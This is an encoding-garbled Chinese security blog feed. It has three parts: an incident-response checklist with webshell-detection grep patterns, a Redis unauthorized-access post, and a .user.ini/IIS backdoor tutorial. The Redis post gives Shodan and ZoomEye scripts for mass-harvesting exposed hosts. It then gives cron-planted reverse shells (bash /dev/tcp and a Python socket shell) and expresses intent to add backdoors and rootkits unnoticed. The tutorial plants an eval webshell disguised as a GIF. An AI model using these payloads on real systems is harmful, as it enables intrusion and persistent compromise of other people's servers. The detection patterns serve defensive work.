<p>windows:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">x:\RECYCLER\</div><div class="line">C:\Documents and Settings\</div><div class="line">c:\users\</div><div class="line">c:\windows\temp\</div><div class="line">IISçš„é»˜è®¤ä¸Šä¼ ç›®å½•</div><div class="line">æ—¥å¿—åˆ†æå·¥å…·ï¼š</div><div class="line">[Webæ—¥å¿—å®‰å…¨åˆ†æå·¥å…· v2.0.exe]()</div></pre></td></tr></table></figure></p>
<p><strong>åº”ç”¨ç³»ç»Ÿæ—¥å¿—</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">MySQL; åœ¨mysql.logæ‰¾é”™è¯¯æ¶ˆæ¯ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ç»“æ„æŸåçš„è¡¨ï¼Œ æ˜¯å¦æœ‰innodbä¿®å¤è¿›ç¨‹åœ¨è¿è¡Œï¼Œæ˜¯å¦æœ‰disk/index/query é—®é¢˜.</div><div class="line">PHP-FPM; å¦‚æœè®¾å®šäº† php-slow æ—¥å¿—, ç›´æ¥æ‰¾é”™è¯¯ä¿¡æ¯ (php, mysql, memcache, â€¦)ã€‚</div><div class="line">Varnish; åœ¨varnishlog å’Œ varnishstat é‡Œ, æ£€æŸ¥ hit/missæ¯”. çœ‹çœ‹é…ç½®ä¿¡æ¯é‡Œæ˜¯å¦é—æ¼äº†ä»€ä¹ˆè§„åˆ™ï¼Œä½¿æœ€ç»ˆç”¨æˆ·å¯ä»¥ç›´æ¥æ”»å‡»ä½ çš„åç«¯ï¼Ÿ</div><div class="line">HA-Proxy; åç«¯çš„çŠ¶å†µå¦‚ä½•ï¼Ÿå¥åº·çŠ¶å†µæ£€æŸ¥æ˜¯å¦æˆåŠŸï¼Ÿæ˜¯å‰ç«¯è¿˜æ˜¯åç«¯çš„é˜Ÿåˆ—å¤§å°è¾¾åˆ°æœ€å¤§å€¼äº†ï¼Ÿ</div></pre></td></tr></table></figure></p>
<h1 id="å…¥ä¾µåæ¶æ„æ–‡ä»¶æŸ¥æ‰¾"><a href="#å…¥ä¾µåæ¶æ„æ–‡ä»¶æŸ¥æ‰¾" class="headerlink" title="å…¥ä¾µåæ¶æ„æ–‡ä»¶æŸ¥æ‰¾"></a>å…¥ä¾µåæ¶æ„æ–‡ä»¶æŸ¥æ‰¾</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">find -mtime -2 -type f -name \*.php æŸ¥æ‰¾è¿‘2å¤©è¢«ä¿®æ”¹è¿‡çš„æ–‡ä»¶</div><div class="line">find /app -user root  æŸ¥æ‰¾appç›®å½•ä¸‹å±äºrootç”¨æˆ·çš„æ–‡ä»¶</div><div class="line">æŸ¥æ‰¾å­˜åœ¨åˆ¶å®šå…³é”®å­—çš„æ¶æ„è„šæœ¬æœ¨é©¬</div><div class="line">find ./ -name &quot;*.php&quot; |xargs egrep &quot;phpspy|c99sh|milw0rm|eval\(gunerpress|eval\(base64_decode|spider_bc&quot;&gt; /tmp/php.txt</div><div class="line">grep -r --include=*.php  &apos;[^a-z]eval($_POST&apos; . &gt; /tmp/eval.txt</div><div class="line">grep -r --include=*.php  &apos;file_put_contents(.*$_POST\[.*\]);&apos; . &gt; /tmp/file_put_contents.txt</div><div class="line">find ./ -name &quot;*.php&quot; -type f -print0 | xargs -0 egrep &quot;(phpspy|c99sh|milw0rm|eval\(gzuncompress\(base64_decode|eval\(base64_decode|spider_bc|gzinflate)&quot; | awk -F: &apos;&#123;print $1&#125;&apos; | sort | uniq</div><div class="line">linux ä¸‹webshellæŸ¥æ€ï¼š</div><div class="line">find /www/ -name &quot;*.php&quot; |xargs egrep &apos;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\&#123;\&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode&apos;</div><div class="line">æŸ¥æ€è„šæœ¬ï¼š</div><div class="line">[webshellæŸ¥æ€è„šæœ¬.py]()</div><div class="line">[webshellkill_linux.py]()</div><div class="line">rootkitæŸ¥æ‰¾</div><div class="line">windowsä¸‹ï¼š</div><div class="line">[PC Hunter]http://www.xuetr.com/)</div><div class="line">[PowerTool] (http://about.me/ithurricanept)</div><div class="line">linuxä¸‹ï¼š</div><div class="line">[Rootkit Hunter](http://rkhunter.sourceforge.net/)</div><div class="line">å¸¸è§„åé—¨æŸ¥æ‰¾</div><div class="line">shiftåé—¨ç­‰</div><div class="line">[Dç›¾_WebæŸ¥æ€](http://d99net.net/News.asp?id=62)</div><div class="line">[Safe3 WebShell Scanner](http://www.273tech.com/works/884981847/view.htm)</div><div class="line">[æš—ç»„Webæ€æ¯’ 2.6](http://forum.cnsec.org/thread-93025-1-1.html)</div></pre></td></tr></table></figure>
<h1 id="å…¶ä»–æ–¹é¢æ£€æµ‹"><a href="#å…¶ä»–æ–¹é¢æ£€æµ‹" class="headerlink" title="å…¶ä»–æ–¹é¢æ£€æµ‹"></a>å…¶ä»–æ–¹é¢æ£€æµ‹</h1><ul>
<li>ç½‘ç»œç›¸å…³</li>
<li>å¼‚å¸¸æµé‡</li>
<li>DDOS</li>
<li>ARP</li>
<li>DNS</li>
<li>æ•°æ®åº“</li>
</ul>
<h1 id="å¸¸è§é—®é¢˜"><a href="#å¸¸è§é—®é¢˜" class="headerlink" title="å¸¸è§é—®é¢˜"></a>å¸¸è§é—®é¢˜</h1><p><strong>å…³é”®æ–‡ä»¶è®¾ç½®</strong><br>ä½¿ç”¨<code>chattr</code>å‘½ä»¤é˜²æ­¢ç³»ç»Ÿä¸­æŸä¸ªå…³é”®æ–‡ä»¶è¢«ä¿®æ”¹ï¼š<code>chattr +i /etc/resolv.conf</code><br>æŸ¥çœ‹ä½¿ç”¨ï¼š<code>lsattr /etc/resolv.conf</code><br>ä¼šæ˜¾ç¤ºå¦‚ä¸‹å±æ€§</p>
<blockquote>
<p>â€”-iâ€”â€”â€“ /etc/resolv.conf</p>
</blockquote>
<p>è¦æƒ³ä¿®æ”¹æ­¤æ–‡ä»¶å°±è¦æŠŠiå±æ€§å»æ‰ï¼š <code>chattr -i /etc/resolv.conf</code><br>è®©æŸä¸ªæ–‡ä»¶åªèƒ½å¾€é‡Œé¢è¿½åŠ æ•°æ®ï¼Œä½†ä¸èƒ½åˆ é™¤(ç”¨äºå„ç§æ—¥å¿—æ–‡ä»¶ä¸Š)ï¼š<code>chattr +a /var/log/messages</code><br><strong>ç³»ç»Ÿå‘½ä»¤è¢«æ›¿æ¢</strong></p>
<p>1ã€å¯ä»¥é€‰æ‹©é‡æ–°è¿˜åŸå›å»:<code>yum install e2fsprogs</code>;<br>2ã€ä¹Ÿå¯ä»¥ä½¿ç”¨ç³»ç»Ÿå‘½ä»¤å·¥å…·åŒ…busyboxï¼Œæœ€å<code>busybox è¦è¿˜åŸçš„å‘½ä»¤ -i</code><br><strong>æ—¥å¿—æŸ¥çœ‹</strong><br><code>/var/log/secure</code>æ—¥å¿—å¯ä»¥æŸ¥çœ‹<code>Accept</code>å…³é”®å­—;<br>æŸ¥æ‰¾è®¿é—®å’Œé”™è¯¯æ—¥å¿—, ç›´æ¥æ‰¾<code>5xx</code>é”™è¯¯, å†çœ‹çœ‹æ˜¯å¦æœ‰<code>limit_zone</code>é”™è¯¯;</p>
<p><strong>æ—¥å¿—æ–‡ä»¶æ¢å¤</strong><br>linuxä¸‹æ—¥å¿—æ–‡ä»¶æ¢å¤å¯ä½¿ç”¨<code>lsof</code>æ¢å¤åˆ é™¤çš„æ—¥å¿—æ–‡ä»¶(å‰ææ˜¯ä¸èƒ½å…³é—­æœåŠ¡å™¨ï¼Œä¸èƒ½å…³é—­ç›¸å…³æœåŠ¡æˆ–è¿›ç¨‹)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lsof | grep access_log</div><div class="line">cat /proc/$PID/fd/$æ–‡ä»¶æè¿°ç¬¦ &gt; /var/log/httpd/access_log</div></pre></td></tr></table></figure></p>
<p><strong>éƒ¨åˆ†å‘½ä»¤æ— æ³•æ‰§è¡Œ</strong></p>
<p>å½“ç”¨æˆ·ç¯å¢ƒå˜é‡é…ç½®ä¸å½“æ—¶ï¼Œéƒ¨åˆ†å‘½ä»¤æ— æ³•ç›´æ¥æ‰§è¡Œï¼Œéœ€è¦åœ¨å‘½ä»¤ä¹‹å‰åŠ ä¸Šè·¯å¾„ï¼Œå¦‚ï¼š/etc/sbin/ifconfig</p>
]]></content>
      
        
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> webshell </tag>
            
            <tag> linux </tag>
            
            <tag> åº”æ€¥å“åº” </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å…³äºMongoDBæœªæˆæƒè®¿é—®çš„å­¦ä¹ ]]></title>
      <url>/2017/01/13/%E5%85%B3%E4%BA%8EMongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>æœ€è¿‘MongoDBçš„æœªæˆæƒè®¿é—®ä¸çŸ¥é“ä¸ºå•¥ï¼Œå°±æ˜¯è¿™æ ·çªç„¶ç«äº†ï¼Œå…¶å®ä½ è¦æ˜¯ç•™æ„çš„è¯ï¼Œå…¶å®åœ¨2014å¹´çš„æ—¶å€™å°±å·²ç»æœ‰äººåœ¨ä¹Œäº‘åˆ·è¿‡è¿™ä¸ªäº†ï¼Œå…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯æ²¡å¯†ç ï¼Œç„¶åæš´éœ²åˆ°å…¬ç½‘ä¸Šå–½ã€‚<br><a id="more"></a></p>
<p>æœ¬æ¬¡ä¸»è¦åšä¸€äº›redisçš„ä¸€ä¸ªæµ‹è¯•ï¼Œåˆšå¥½æœ€è¿‘å†å¼€å‘ä¸€ä¸ªç³»ç»Ÿï¼Œåˆšå¥½å†™å‡ ä¸ªè„šæœ¬åšæ’ä»¶ï¼Œä¹Ÿæé«˜ä¸‹å·¥ä½œæ•ˆç‡ã€‚</p>
<p>å…·ä½“æ¼æ´ç»†èŠ‚è¯·å‚è€ƒï¼š<a href="http://www.freebuf.com/vuls/85021.html" target="_blank" rel="external">redisæœªæˆæƒè®¿é—®</a></p>
<p>ç„¶ååˆ©ç”¨ZoomEyeå’ŒShodan APIè¿›è¡Œæ¡ä»¶æ‰¹é‡ç­›é€‰</p>
<p><strong>ZoomEyeï¼š</strong><code>https://api.zoomeye.org/host/search?query=&quot;å…³é”®è¯&quot;&amp;page=</code><br><strong>Shodanï¼š</strong><code>pip install shodan</code></p>
<p><strong>Shodan pythonè„šæœ¬å¦‚ä¸‹ï¼š</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Authorï¼šw2n1ck</div><div class="line">@åšå®¢ï¼šhttp://byd.dropsec.xyz/</div><div class="line">&apos;&apos;&apos;</div><div class="line">import shodan</div><div class="line">import os</div><div class="line">iplist = []</div><div class="line">ip_list = []</div><div class="line">shodan_ip_list = []</div><div class="line">def shodanSearch(keywords):</div><div class="line"></div><div class="line">    SHODAN_API_KEY = &quot;your key&quot;</div><div class="line">    api = shodan.Shodan(SHODAN_API_KEY)</div><div class="line"></div><div class="line">    total = 0</div><div class="line">    try:</div><div class="line">        results = api.search(keywords)</div><div class="line">        total = int(results[&apos;total&apos;])</div><div class="line">        for result in results[&apos;matches&apos;]:</div><div class="line">            #iplist.append(&#123;&quot;ip&quot;:result[&apos;ip_str&apos;],&quot;country&quot;:result[&apos;location&apos;][&apos;country_name&apos;]&#125;)</div><div class="line">            iplist.append(result[&apos;ip_str&apos;])</div><div class="line">            for i in range(len(iplist)):</div><div class="line">                ip_list = iplist[i].encode(&apos;utf-8&apos;)</div><div class="line">                shodan_ip_list.append(ip_list)</div><div class="line">                s = &apos;\n&apos;.join(shodan_ip_list)</div><div class="line">                with open(&apos;shodan_ip_list.txt&apos;,&apos;w&apos;) as output:</div><div class="line">                    output.write(s)</div><div class="line"></div><div class="line">    except shodan.APIError, e:</div><div class="line">        print &apos;Error: %s&apos; % e</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line"></div><div class="line">    shodanSearch(&apos;redis&apos;)</div></pre></td></tr></table></figure></p>
<p><strong>ZoomEye pythonè„šæœ¬å¦‚ä¸‹ï¼š</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Authorï¼šw2n1ck</div><div class="line">@åšå®¢ï¼šhttp://byd.dropsec.xyz/</div><div class="line">&apos;&apos;&apos;</div><div class="line">import os</div><div class="line">import requests</div><div class="line">import json</div><div class="line">access_token = &apos;&apos;</div><div class="line">ip_list = []</div><div class="line"></div><div class="line">def login():</div><div class="line">    user = raw_input(&apos;[-] input : username :&apos;)</div><div class="line">    passwd = raw_input(&apos;[-] input : password :&apos;)</div><div class="line">    data = &#123;</div><div class="line">        &apos;username&apos; : user,</div><div class="line">        &apos;password&apos; : passwd</div><div class="line">    &#125;</div><div class="line">    data_encoded = json.dumps(data)  # dumps å°† python å¯¹è±¡è½¬æ¢æˆ json å­—ç¬¦ä¸²</div><div class="line">    try:</div><div class="line">        r = requests.post(url = &apos;https://api.zoomeye.org/user/login&apos;,data = data_encoded)</div><div class="line">        r_decoded = json.loads(r.text) # loads() å°† json å­—ç¬¦ä¸²è½¬æ¢æˆ python å¯¹è±¡</div><div class="line">        global access_token</div><div class="line">        access_token = r_decoded[&apos;access_token&apos;]</div><div class="line">    except Exception,e:</div><div class="line">        print &apos;[-] info : username or password is wrong, please try again &apos;</div><div class="line">        exit()</div><div class="line">def saveStrToFile(file,str):</div><div class="line">    with open(file,&apos;w&apos;) as output:</div><div class="line">        output.write(str)</div><div class="line">def saveListToFile(file,list):</div><div class="line">    s = &apos;\n&apos;.join(list)</div><div class="line">    with open(file,&apos;w&apos;) as output:</div><div class="line">        output.write(s)</div><div class="line">def apiTest():</div><div class="line">    page = 1</div><div class="line">    global access_token</div><div class="line">    with open(&apos;access_token.txt&apos;,&apos;r&apos;) as input:</div><div class="line">        access_token = input.read()</div><div class="line">    # å°† token æ ¼å¼åŒ–å¹¶æ·»åŠ åˆ° HTTP Header ä¸­</div><div class="line">    headers = &#123;</div><div class="line">        &apos;Authorization&apos; : &apos;JWT &apos; + access_token,</div><div class="line">    &#125;</div><div class="line">    print headers</div><div class="line">    while(True):</div><div class="line">        try:</div><div class="line">            r = requests.get(url = &apos;https://api.zoomeye.org/host/search?query=&quot;redis&quot;&amp;page=&apos; + str(page),</div><div class="line">                         headers = headers)</div><div class="line">            &apos;&apos;&apos;</div><div class="line">            å› ä¸ºæˆ‘ä»¬è¿›è¡Œçš„æ˜¯ä¸»æœºæœç´¢ï¼Œæ‰€ä»¥è¯·æ±‚çš„æ¥å£ä¸º:</div><div class="line">            https://api.zoomeye.org/host/search?query=&quot;yoursring&quot;&amp;facet=app,os&amp;page=</div><div class="line">            å¦‚æœè¿›è¡Œwebæœç´¢ï¼Œè¯·æ±‚æ¥å£ä¸º:</div><div class="line">            https://api.zoomeye.org/web/search?query=&quot;port:21&quot;&amp;page=</div><div class="line">            ?queryä¸ºè¦æœç´¢çš„å…³é”®å­—</div><div class="line">            &apos;&apos;&apos;</div><div class="line">            r_decoded = json.loads(r.text)</div><div class="line">            # print r_decoded</div><div class="line">            # print r_decoded[&apos;total&apos;]</div><div class="line">            for x in r_decoded[&apos;matches&apos;]:</div><div class="line">                print x[&apos;ip&apos;]</div><div class="line">                ip_list.append(x[&apos;ip&apos;])</div><div class="line">            print &apos;[-] info : count &apos; + str(page * 10)</div><div class="line">        except Exception,e:</div><div class="line">            # è‹¥æœç´¢è¯·æ±‚è¶…è¿‡ API å…è®¸çš„æœ€å¤§æ¡ç›®é™åˆ¶ æˆ–è€… å…¨éƒ¨æœç´¢ç»“æŸï¼Œåˆ™ç»ˆæ­¢è¯·æ±‚</div><div class="line">            if str(e.message) == &apos;matches&apos;:</div><div class="line">                print &apos;[-] info : account was break, excceeding the max limitations&apos;</div><div class="line">                break</div><div class="line">            else:</div><div class="line">                print  &apos;[-] info : &apos; + str(e.message)</div><div class="line">        else:</div><div class="line">            if page == 10:</div><div class="line">                break</div><div class="line">            page += 1</div><div class="line">def main():</div><div class="line">    # è®¿é—®å£ä»¤æ–‡ä»¶ä¸å­˜åœ¨åˆ™è¿›è¡Œç™»å½•æ“ä½œ</div><div class="line">    if not os.path.isfile(&apos;access_token.txt&apos;):</div><div class="line">        print &apos;[-] info : access_token file is not exist, please login&apos;</div><div class="line">        login()</div><div class="line">        saveStrToFile(&apos;access_token.txt&apos;,access_token)</div><div class="line"></div><div class="line">    apiTest()</div><div class="line">    saveListToFile(&apos;zoomeye_ip_list.txt&apos;,ip_list)</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<p>æŠŠè¦æœç´¢çš„å…³é”®è¯æ”¹ä¸€ä¸‹å³å¯æ‰¹é‡è·å–ç¬¦åˆæ¡ä»¶çš„ä¸»æœºåœ°å€ï¼š<br><img src="http://oa8y5guqs.bkt.clouddn.com/redis1.png" alt=""></p>
<p>ç„¶åå°±æ˜¯redisçš„æ‰¹é‡éªŒè¯è„šæœ¬,GitHubä¸Šæœ‰ä¸€ä¸ª<a href="https://github.com/Ridter/hackredis" target="_blank" rel="external">hackredis</a>è„šæœ¬èƒ½å¤ŸéªŒè¯redisæœªæˆæƒè®¿é—®ï¼Œç„¶åæ‰¹é‡ç™»é™†åˆ°sshï¼Œä½†æ˜¯æˆ‘æœçš„ï¼Œå¯èƒ½äººå“å¤ªå·®ï¼Œä¸€ä¸ªéƒ½æ²¡ç™»é™†ä¸Šï¼Œå¯èƒ½ä¸å¯¹å…¬ç½‘å¼€æ”¾SSHæœåŠ¡äº†æˆ–è€…åšäº†IPé™åˆ¶ã€‚<br><img src="http://oa8y5guqs.bkt.clouddn.com/redis2.png" alt=""></p>
<p>ç„¶åå°±æ¢ä¸ªæ€è·¯ï¼Œæˆ‘ä»¬å†™å…¥çš„å¯†é’¥ï¼Œä¼šè¦†ç›–è¿™ä¸ªæ–‡ä»¶authorized_keysï¼Œå¦‚æœåŸæ¥æœåŠ¡å™¨ä¸Šç®¡ç†å‘˜æ˜¯ä½¿ç”¨è¿‡å…¬é’¥çš„æ–¹æ³•ç™»é™†å°±ä¼šå¯¼è‡´ç®¡ç†å‘˜çš„å…¬é’¥å¤±æ•ˆï¼Œå®¹æ˜“è¢«ç®¡ç†å‘˜å‘ç°ã€‚ç›´æ¥åœ¨redisä¸‹å†™ä¸ªshellï¼Œç§ä¸ªåé—¨ï¼Œå†åŠ ä¸ªrootkitï¼Œå²‚ä¸æ˜¯ç¥ä¸çŸ¥é“é¬¼ä¸è§‰[æ–œçœ¼]</p>
<p><strong>redisåå¼¹shellï¼š</strong></p>
<ol>
<li><p>CentOS</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">echo -e &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/è¿œç¨‹ä¸»æœº/2333 0&gt;&amp;1\n\n&quot;|redis-cli -h ç›®æ ‡æœº -x set 1</div><div class="line"></div><div class="line">config set dir /var/spool/cron</div><div class="line">ok</div><div class="line">config set dbfilename root</div><div class="line">ok</div><div class="line">save</div><div class="line">ok</div><div class="line"></div><div class="line">ç„¶åvpsä¸Šncç›‘å¬</div><div class="line">nc -lvv 2333</div></pre></td></tr></table></figure>
</li>
<li><p>Ubuntu<br>å¦‚æœæ˜¯ubuntuçš„ç³»ç»Ÿï¼Œæ˜¯ä¸èƒ½ç”¨bashå¼¹shellçš„ï¼Œå¯ä»¥ä½¿ç”¨pythonæ¥åå¼¹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -e &quot;\n\n*/1 * * * * /usr/bin/python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.0.0.1\&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;\n\n&quot;</div></pre></td></tr></table></figure>
</li>
</ol>
<p><strong>é™„åŠ ä¸ªå»ºè®®ï¼š</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">å¯ä»¥é…ç½®redis.confè¿™ä¸ªæ–‡ä»¶ï¼Œåœ¨redis-3.2.0ç›®å½•ä¸‹</div><div class="line">#é»˜è®¤åªå¯¹æœ¬åœ°å¼€æ”¾</div><div class="line">bind 127.0.0.1</div><div class="line">#æ·»åŠ ç™»é™†å¯†ç </div><div class="line">requirepass appleu0</div><div class="line">#åœ¨éœ€è¦å¯¹å¤–å¼€æ”¾çš„æ—¶å€™ä¿®æ”¹é»˜è®¤ç«¯å£</div><div class="line">port 2333</div><div class="line">#æœ€åè¿˜å¯ä»¥é…åˆiptablesé™åˆ¶å¼€æ”¾</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> Python </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> Redis </tag>
            
            <tag> MongoDB </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iniå’Œiisåé—¨]]></title>
      <url>/2017/01/03/ini%E5%92%8Ciis%E5%90%8E%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>æœ€è¿‘çœ‹äº†ä¸¤ä¸ªå…³äºiniå’Œåˆ©ç”¨iisæœ¬èº«æœºåˆ¶çš„åé—¨ã€‚<br><a id="more"></a></p>
<h1 id="iniåé—¨"><a href="#iniåé—¨" class="headerlink" title="iniåé—¨"></a>iniåé—¨</h1><p><code>.user.ini</code>å®ƒæ¯”<code>.htaccess</code>ç”¨çš„æ›´å¹¿ï¼Œä¸ç®¡æ˜¯<code>nginx/apache/IIS</code>ï¼Œåªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ã€‚</p>
<p><code>.user.ini</code>å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„<code>php.ini</code>ï¼Œæˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯æ¨¡å¼ä¸ºâ€œ<code>PHP_INI_PERDIR</code> ã€ <code>PHP_INI_USER</code>â€çš„è®¾ç½®ã€‚å’Œ<code>php.ini</code>ä¸åŒçš„æ˜¯ï¼Œ<code>.user.ini</code>æ˜¯ä¸€ä¸ªèƒ½è¢«åŠ¨æ€åŠ è½½çš„iniæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä¿®æ”¹äº†<code>.user.ini</code>åï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ä¸­é—´ä»¶ï¼Œåªéœ€è¦ç­‰å¾…<code>user_ini.cache_ttl</code>æ‰€è®¾ç½®çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º300ç§’ï¼‰ï¼Œå³å¯è¢«é‡æ–°åŠ è½½</p>
<h2 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h2><ol>
<li><p>æ–°å»º<code>.user.ini</code>ï¼Œå†…å®¹ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">auto_prepend_file=test.gif</div></pre></td></tr></table></figure>
</li>
<li><p>æ–°å»º<code>test.gif</code>ï¼Œå†…å®¹ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">@eval($_REQUEST[shell]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>æ–°å»º<code>echo.php</code>,å†…å®¹ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">echo &quot;PHP is very good!&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>è®¿é—®<code>echo.php</code>å³å¯çœ‹åˆ°åé—¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:8080/php-backdoor/echo.php?shell=phpinfo();</div></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="iisåé—¨"><a href="#iisåé—¨" class="headerlink" title="iisåé—¨"></a>iisåé—¨</h1><p>iisåé—¨æ˜¯ç”¨äº†iisæœ¬èº«çš„æœºåˆ¶ï¼Œå½“åœ¨httpå¤´é‡Œå¢åŠ ä¸€å­—æ®µå³å¯è§¦å‘åé—¨ï¼Œå¹¶æ‰§è¡Œå‘è¿‡æ¥çš„å‘½ä»¤ã€‚</p>
